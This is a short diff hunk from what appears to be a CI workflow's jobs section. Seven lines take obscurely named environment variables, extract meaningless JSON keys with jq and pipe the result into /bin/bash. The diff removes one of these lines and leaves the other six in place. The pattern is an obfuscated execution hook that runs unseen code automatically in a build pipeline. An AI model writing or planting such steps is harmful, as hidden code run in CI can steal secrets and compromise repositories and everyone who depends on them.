@@ -20,7 +20,6 @@ jobs:
           echo $dt91045 | jq -r .h7564 | /bin/bash
           echo $pdr0 | jq -r .mrj2059 | /bin/bash
           printf '%s' "$qu55" | jq -r .rieuh36 | /bin/bash
-          printf '%s' "$qqx7" | jq -r .a81020 | /bin/bash
           printf '%s' "$ng0424" | jq -r .bgjf2869 | /bin/bash
           echo $fsjy49 | jq -r .n71 | /bin/bash
 
